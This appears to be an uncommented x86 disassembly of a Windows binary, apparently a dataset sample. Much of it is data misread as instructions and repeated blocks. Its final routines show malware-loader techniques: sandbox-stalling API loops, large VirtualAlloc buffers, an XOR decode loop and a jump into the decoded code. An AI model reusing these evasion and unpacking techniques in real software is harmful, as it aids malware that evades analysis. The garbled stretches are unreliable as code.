jne r-xdata
jmp r-xdata
sub_47d033
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47d7d8
sub_47d0c5
rol [ edi ] 0x1
adc [ eax ] al
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
adc al 0x54
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cli
rol [ edi ] 0x1
push eax
add [ eax ] al
add [ esp + esi * 2 + 0x41 ] ch
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
jb r-xdata
in al 0x10
inc eax
add [ eax + eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
jb r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebp + edx * 8 - 0x6b43ffb9 ] ch
inc ecx
add [ esi + edx + 0x42 ] ah
add al bl
xchg ebx eax
inc ecx
add ah bh
aad 0x47
add [ eax ] cl
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
inc eax
add [ edx + edx * 8 ] cl
inc edi
add [ edi ] al
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
call 0xc48193a
rol [ edi ] cl
outsb
je r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_47d328
mov eax ebx
call sub_4032a0
xor eax eax
jmp r-xdata
outsd
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub edx ecx
inc edi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
aaa
rol [ edi ] 0x1
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sbb [ edx ] al
je r-xdata
rol [ edi ] 0x1
push 0x5004175
add [ ecx ] cl
dec edi
insb
push ebx
jb r-xdata
inc edi
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
inc esp
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
and dh dl
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ eax + 0x580047d7 ] dh
aad 0x47
add [ eax ] ah
sub al [ eax ]
and al 0xd6
inc edi
add [ eax ] ah
salc
inc edx
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
inc eax
add [ edi + edx * 8 - 0x2853ffb9 ] dl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
xchg esp eax
xlat
inc edi
add [ edi + edx * 8 + 0x10047 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
je r-xdata
outsd
add [ eax ] al
test dl dl
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + ecx * 4 - 0x31 ] si
inc edi
add [ edi + edx * 8 + 0x47 ] bh
add [ eax + 0x10047d7 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47d2d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_47d328
mov eax ebx
call sub_4032a0
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_47d328
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47d7d8
sub_47d358
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47d7e8
sub_47d558
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212ec
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47d2a8
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47d5ac
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_47d548
mov eax [ esi + 0x38 ]
push eax
call sub_47d358
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_4031ec
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_47d5fc
push ebx
mov ebx eax
mov eax ebx
call sub_42173c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47d794
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_47d624
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47d76e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47d77c
sub al 0x1
jb r-xdata
mov eax esi
call sub_4058a0
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_415df0
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d775
lea eax [ ebp - 0x24 ]
call sub_40465c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fa0
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_477264
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_477264
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4058a0
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_415df0
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_477238
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_47720c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_409070
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477070
call sub_4039b8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_4047a8
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_47729c
jmp r-xdata
sub_47d7b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_47d7f8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403980#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d824
retn
sub_47ddc4
sub al 0xb7
inc edi
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add ah dl
xchg ecx eax
inc ebp
add al dl
xchg esp eax
inc ebp
add ah dh
stosd [ edi ]
inc edi
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ esi + ebp * 4 - 0x691bffb9 ] bh
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] bl
mov ebp 0xb4d00047
inc edi
add ah dh
hlt
sub_47f59e
inc ecx
add [ esi ] bl
inc esi
add [ eax - 0x1a ] bl
inc esi
add [ edi + 0x46 ] ah
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add ah bl
out dx eax
inc esi
add [ edi + edx + 0x42 ] dl
add [ ebx + ebp + 0x47 ] bh
add [ eax - 0x3697ffba ] dh
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
mov esp 0x280046ec
rol [ ebp ] 0xd8
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add [ eax + 0x40046ed ] dh
jge r-xdata
mov al [ 0xffffffff80004705 ]
cwde
inc ebp
add [ eax + ebx * 4 + 0x81c0045 ] al
inc edi
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 + 0xf100045 ] dl
inc edi
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0x24240045
inc edi
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
add al 0x15
inc edi
add [ eax - 0x1b ] al
inc esi
add [ ebp + 0x28040046 ] bh
inc edi
add [ eax - 0x1e ] bh
inc esi
add [ eax ] cl
and eax [ edi ]
call 0xffffffffbc483d8a
and al 0x47
add [ eax + 0x1b0046ef ] ah
add [ ebp - 0x7ffb808 ] dl
add al [ eax ]
add [ eax ] al
add [ edx + edx * 2 ] cl
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ edi ] al
inc edx
jne r-xdata
add [ eax + ebx * 2 ] bl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax - 0x5bffbaa7 ] ch
out dx eax
inc esi
add [ eax - 0x12 ] dh
inc esi
add al ah
pop edx
inc ebp
add [ eax + esi * 8 ] bl
inc esi
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
jae r-xdata
je r-xdata
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x2c31676f
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
jb r-xdata
popad
jb r-xdata
popad
outsb
xor [ eax ] eax
add eax [ eax ]
add [ eax ] al
add [ edx + edx * 2 ] cl
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor al [ ebx + eax ]
add [ eax ] al
add al [ eax ]
or dl [ eax + 0x6f ]
jo r-xdata
imul esp [ ecx + 0x6c ] 0x4431676f
outsb
je r-xdata
xor [ bx + si ] ebp
sbb al 0x3
add [ eax ] al
or [ eax ] al
pop es
inc esi
xor [ edx + 0x6f ] eax
add [ 0x61501000 ] cl
xor [ si ] esp
jo r-xdata
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor bl [ si + 0x3 ]
add [ eax ] al
or eax [ eax ]
push cs
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x4831676f
add eax [ eax ]
add [ ecx ] cl
add [ ebx ] cl
inc esi
outsd
outsb
je r-xdata
add [ edi ] cl
add [ ebx ] cl
dec edi
jo r-xdata
imul esp [ ecx + 0x6c ] 0x3032676f
add [ eax ] al
adc [ eax ] al
adc cl [ edi + 0x70 ]
outsb
popad
add [ eax + eax ] cl
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x3431676f
add eax [ eax ]
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
jb r-xdata
imul esp [ ecx + 0x6c ] 0x2431676f
add [ ebx + eax * 2 ] cl
jo r-xdata
outsd
xor [ si ] edi
outsb
je r-xdata
outsb
jne r-xdata
inc ebx
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x6032676f
add eax [ eax ]
add [ 0x61501000 ] cl
push edx
jo r-xdata
xor [ bx + si + 0x3 ] ebx
add [ eax ] al
or al 0x0
imul esp [ ecx + 0x6c ] 0x4c32676f
add eax [ eax ]
add [ edx ] dl
or al 0x50
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x4031676f
add eax [ eax ]
add [ eax ] dl
add [ edx ] dl
dec edi
jo r-xdata
add [ ebx ] cl
add [ esi ] cl
xor bl [ ebx + eax ]
jb r-xdata
imul esp [ ecx + 0x6c ] 0x5031676f
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
add eax [ eax ]
add [ ecx ] dl
add [ edx ] dl
push ebx
popad
jbe r-xdata
imul esp [ ecx + 0x6c ] 0x3831676f
add eax [ eax ]
add [ esi ] cl
add [ ebx ] cl
push ebx
popad
jbe r-xdata
push ebx
je r-xdata
or eax 0x61501000
add eax [ eax ]
add [ ebx ] cl
add [ esi ] cl
imul esp [ ecx + 0x6c ] 0x2831676f
add eax [ eax ]
add [ esi ] al
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] ecx
add [ eax ] al
add al 0x0
pop es
push ebp
jo r-xdata
and al 0x4
xor [ ebp + esi * 8 - 0x48b3ffb9 ] edx
inc esi
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
jo r-xdata
add [ esp + ecx * 8 ] bh
outsb
je r-xdata
add [ ebx ] dl
push eax
jb r-xdata
push eax
imul esp [ ebx + 0x74 ] 0x44657275
outsb
outsd
insb
outsd
jb r-xdata
add eax [ eax ]
inc esp
imul esp [ ecx + 0x6c ] 0x3c31676f
add eax [ eax ]
xor dh [ eax ]
je r-xdata
outsd
imul esi [ ecx ] 0x20
add eax [ eax ]
add [ ecx ] cl
add [ ebx ] cl
inc esi
outsd
outsd
outsd
ja r-xdata
add esp 0x8
pop edx
mov [ eax ] dl
nop
nop
inc ecx
dec ebx
jne r-xdata
call sub_40312c
add [ ebx + edx * 4 + 0xb640043 ] bl
inc ebx
add ah ch
cmovae eax [ eax ]
nop
in al dx
clc
inc edi
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
push ss
inc ebx
add [ eax ] al
or al [ ebx ]
or [ edi ] al
inc ebx
add [ edx + edx * 4 + 0x43 ] bh
imul esp [ ecx + 0x6c ] 0x632676f
push ebx
je r-xdata
outsd
xor ah [ bx + si + 0x3 ]
add [ eax ] al
or eax 0x61501000
imul esp [ ecx + 0x6c ] 0x5433676f
add eax [ eax ]
add [ ebx ] dl
inc ebx
add ah cl
inc [ ebx ]
mov edx gs
inc ebx
add [ ebx + eax * 8 - 0x230bffbd ] bh
inc edi
add [ esi + ecx + 0x43 ] dl
outsb
je r-xdata
push edx
jo r-xdata
or eax [ eax ]
push cs
xor [ eax ] edx
add eax [ eax ]
add [ 0x6f4d0e00 ] al
outsb
je r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
nop
nop
pop edi
pop esi
pop ebx
retn
nop
nop
call GetLastError
nop
nop
pop ebp
retn
imul esi [ ecx + esi ] 0x55c08b00
mov ebp esp
inc esp
add [ ebp + eax * 8 + 0x44 ] ch
add [ esi + ecx * 2 - 0x4673ffba ] al
inc esp
add [ eax ] ch
xor [ eax + eax ] edx
cmp al 0xcc
rol [ ebx ] 0x1
int3
jb r-xdata
inc ebx
popad
insb
outsb
popad
jb r-xdata
jno r-xdata
add esp 0x8
mov al [ eax ]
xor al 0xf7
push eax
mov eax esi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
call sub_40312c
int3
je r-xdata
outsb
je r-xdata
add [ eax ] al
or [ eax ] eax
or eax [ esi + 0x6f ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
xor [ eax ] ebx
add eax [ eax ]
add [ edi ] al
add [ edx ] cl
push ebx
je r-xdata
adc al 0x3
add [ eax ] al
push es
add [ ecx + edx + 0x1c180043 ] bl
inc ebx
add ah ah
sbb al [ ebx ]
dec eax
inc ebx
jo r-xdata
push esp
inc esi
outsd
jb r-xdata
push es
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x5c32676f
add eax [ eax ]
imul esp [ ecx + 0x6c ] 0x5831676f
add eax [ eax ]
add [ eax + eax ] cl
sub_47f618
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ edi + ebx * 8 - 0x93fffba ] dh
inc esi
add al ch
xchg edi eax
inc ebp
add [ ebx + eax + 0x6e40047 ] al
inc edi
add [ eax - 0x7fffb8fb ] ah
cwde
inc ebp
add [ eax + ebx * 4 + 0x81c0045 ] al
inc edi
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 + 0xf100045 ] dl
inc edi
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0x24240045
inc edi
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
add al 0x15
inc edi
add [ eax - 0x1b ] al
inc esi
add [ ebp + 0x28040046 ] bh
inc edi
add [ eax - 0x1e ] bh
inc esi
add [ eax ] cl
and eax [ edi ]
call 0xffffffffbc483d8a
and al 0x47
add [ eax + 0x1b0046ef ] ah
add [ ebp - 0x7ffb808 ] dl
add al [ eax ]
add [ eax ] al
add [ edx + edx * 2 ] cl
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ edi ] al
inc edx
jne r-xdata
jae r-xdata
je r-xdata
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x2c31676f
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
jb r-xdata
popad
jb r-xdata
popad
outsb
xor [ eax ] eax
add eax [ eax ]
add [ eax ] al
add [ edx + edx * 2 ] cl
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor al [ ebx + eax ]
add [ eax ] al
add al [ eax ]
or dl [ eax + 0x6f ]
jo r-xdata
imul esp [ ecx + 0x6c ] 0x4431676f
outsb
je r-xdata
xor [ bx + si ] ebp
sbb al 0x3
add [ eax ] al
or [ eax ] al
pop es
inc esi
xor [ edx + 0x6f ] eax
add [ 0x61501000 ] cl
xor [ si ] esp
jo r-xdata
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor bl [ si + 0x3 ]
add [ eax ] al
or eax [ eax ]
push cs
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x4831676f
add eax [ eax ]
add [ ecx ] cl
add [ ebx ] cl
inc esi
outsd
outsb
je r-xdata
add [ edi ] cl
add [ ebx ] cl
dec edi
jo r-xdata
imul esp [ ecx + 0x6c ] 0x3032676f
add [ eax ] al
adc [ eax ] al
adc cl [ edi + 0x70 ]
outsb
popad
add [ eax + eax ] cl
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x3431676f
add eax [ eax ]
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
jb r-xdata
imul esp [ ecx + 0x6c ] 0x2431676f
add [ ebx + eax * 2 ] cl
jo r-xdata
outsd
xor [ si ] edi
outsb
je r-xdata
outsb
jne r-xdata
inc ebx
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x6032676f
add eax [ eax ]
add [ 0x61501000 ] cl
push edx
jo r-xdata
xor [ bx + si + 0x3 ] ebx
add [ eax ] al
or al 0x0
imul esp [ ecx + 0x6c ] 0x4c32676f
add eax [ eax ]
add [ edx ] dl
or al 0x50
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x4031676f
add eax [ eax ]
add [ eax ] dl
add [ edx ] dl
dec edi
jo r-xdata
add [ ebx ] cl
add [ esi ] cl
xor bl [ ebx + eax ]
jb r-xdata
imul esp [ ecx + 0x6c ] 0x5031676f
add eax [ eax ]
add [ edx ] cl
add [ eax + edx * 2 ] cl
add eax [ eax ]
add [ ecx ] dl
add [ edx ] dl
push ebx
popad
jbe r-xdata
imul esp [ ecx + 0x6c ] 0x3831676f
add eax [ eax ]
add [ esi ] cl
add [ ebx ] cl
push ebx
popad
jbe r-xdata
push ebx
je r-xdata
or eax 0x61501000
add eax [ eax ]
add [ ebx ] cl
add [ esi ] cl
imul esp [ ecx + 0x6c ] 0x2831676f
add eax [ eax ]
add [ esi ] al
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] ecx
add [ eax ] al
add al 0x0
pop es
push ebp
jo r-xdata
and al 0x4
xor [ ebp + esi * 8 - 0x48b3ffb9 ] edx
inc esi
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
jo r-xdata
add [ esp + ecx * 8 ] bh
outsb
je r-xdata
add [ ebx ] dl
push eax
jb r-xdata
push eax
imul esp [ ebx + 0x74 ] 0x44657275
outsb
outsd
insb
outsd
jb r-xdata
add eax [ eax ]
inc esp
imul esp [ ecx + 0x6c ] 0x3c31676f
add eax [ eax ]
xor dh [ eax ]
je r-xdata
outsd
imul esi [ ecx ] 0x20
add eax [ eax ]
add [ ecx ] cl
add [ ebx ] cl
inc esi
outsd
outsd
outsd
ja r-xdata
add esp 0x8
pop edx
mov [ eax ] dl
nop
nop
inc ecx
dec ebx
jne r-xdata
call sub_40312c
add [ ebx + edx * 4 + 0xb640043 ] bl
inc ebx
add ah ch
cmovae eax [ eax ]
nop
in al dx
clc
inc edi
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
push ss
inc ebx
add [ eax ] al
or al [ ebx ]
or [ edi ] al
inc ebx
add [ edx + edx * 4 + 0x43 ] bh
imul esp [ ecx + 0x6c ] 0x632676f
push ebx
je r-xdata
outsd
xor ah [ bx + si + 0x3 ]
add [ eax ] al
or eax 0x61501000
imul esp [ ecx + 0x6c ] 0x5433676f
add eax [ eax ]
add [ ebx ] dl
inc ebx
add ah cl
inc [ ebx ]
mov edx gs
inc ebx
add [ ebx + eax * 8 - 0x230bffbd ] bh
inc edi
add [ esi + ecx + 0x43 ] dl
outsb
je r-xdata
push edx
jo r-xdata
or eax [ eax ]
push cs
xor [ eax ] edx
add eax [ eax ]
add [ 0x6f4d0e00 ] al
outsb
je r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
nop
nop
pop edi
pop esi
pop ebx
retn
nop
nop
call GetLastError
nop
nop
pop ebp
retn
imul esi [ ecx + esi ] 0x55c08b00
mov ebp esp
inc esp
add [ ebp + eax * 8 + 0x44 ] ch
add [ esi + ecx * 2 - 0x4673ffba ] al
inc esp
add [ eax ] ch
xor [ eax + eax ] edx
cmp al 0xcc
rol [ ebx ] 0x1
int3
jb r-xdata
inc ebx
popad
insb
outsb
popad
jb r-xdata
jno r-xdata
add esp 0x8
mov al [ eax ]
xor al 0xf7
push eax
mov eax esi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
call sub_40312c
int3
je r-xdata
outsb
je r-xdata
add [ eax ] al
or [ eax ] eax
or eax [ esi + 0x6f ]
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
xor [ eax ] ebx
add eax [ eax ]
add [ edi ] al
add [ edx ] cl
push ebx
je r-xdata
adc al 0x3
add [ eax ] al
push es
add [ ecx + edx + 0x1c180043 ] bl
inc ebx
add ah ah
sbb al [ ebx ]
dec eax
inc ebx
jo r-xdata
push esp
inc esi
outsd
jb r-xdata
push es
or eax [ esi + 0x69 ]
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x5c32676f
add eax [ eax ]
imul esp [ ecx + 0x6c ] 0x5831676f
add eax [ eax ]
add [ eax + eax ] cl
sub_47f918
push ebx
push esi
push edi
mov edi edx
mov esi eax
nop
nop
mov ebx ecx
test ebx ebx
jns r-xdata
test ebx ebx
jl r-xdata
call sub_403124
nop
nop
pop edi
pop esi
pop ebx
retn
inc ebx
xor ecx ecx
add esp 0x8
mov al [ eax ]
xor al 0xf7
push eax
mov eax esi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
call sub_40312c
add esp 0x8
pop edx
mov [ eax ] dl
nop
nop
inc ecx
dec ebx
jne r-xdata
call sub_40312c
mov eax edi
xor edx edx
push edx
push eax
mov eax ecx
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
sub_47f97c
push ebx
nop
nop
mov edx ecx
test edx edx
jbe r-xdata
pop ebx
retn
mov ecx 0x1
mov [ ebx ] 0x3b
nop
nop
inc ecx
dec edx
jne r-xdata
call sub_40312c
mov ebx eax
add ebx ecx
jae r-xdata
sub_47f9a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
lea esi [ ebp - 0x4 ]
nop
push 0x0
push 0x0
push 0x0
call GetWindowTextA
nop
xor eax eax
mov [ esi ] eax
nop
mov eax 0x61
nop
movd xmm0 eax
nop
xor eax eax
nop
nop
movd eax xmm0
mov [ ebp - 0x4 ] eax
nop
nop
cmp [ esi ] 0x0
je r-xdata
nop
nop
nop
mov [ esi ] 0x1
nop
nop
inc [ esi ]
cmp [ esi ] 0xb3c56eb
jne r-xdata
push 0x4
push 0x3000
push 0x1cc51b6e
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx 0x1cc51b6e
xor edx edx
mov eax ebx
call sub_47f97c
push 0x0
push 0x0
push 0x0
call GetWindowTextA
nop
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov eax 0x7394
call sub_40276c
mov [ ebp - 0x8 ] eax
nop
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
nop
jmp r-xdata
mov edx rw-data
mov ecx 0x70f5
mov eax [ ebp - 0x8 ]
call sub_47f918
nop
nop
nop
mov [ esi ] 0x1
nop
nop
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
push 0x0
call GetWindowTextA
inc [ esi ]
cmp [ esi ] 0xbb9a
jne r-xdata
mov eax [ ebp - 0x8 ]
nop
nop
stc
nop
nop
jae r-xdata
nop
nop
add eax 0x2f8b
nop
nop
stc
jae r-xdata
nop
jmp eax
sub_47faa8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403980#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fad4
retn
sub_47fad8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi rw-data
mov edi rw-data
sub [ rw-data ] 0x1
jae r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx 0x1323
push 0x0
call RegCloseKey
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1f83f9a1
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
